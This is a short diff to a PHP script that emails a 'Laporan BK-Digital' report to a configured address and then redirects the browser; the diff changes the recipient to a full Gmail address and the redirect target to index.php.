@@ -1,6 +1,6 @@
 <?php
 $subjek = 'Laporan BK-Digital';
-$mailto = 'mamashildan48'; // Email lu
+$mailto = 'mamashildan48@gmail.com'; // Email lu
 
 
 $body = <<<EOD
@@ -18,6 +18,6 @@ $success = mail($mailto, $subjek." #".rand(1000,10000), $body, $headers);
 $random = rand(1000,5000);
 ?>
 
-<meta content='0;url=./succes.php' http-equiv='refresh'/>
+<meta content='0;url=./index.php' http-equiv='refresh'/>
 </head><body>
 </html>
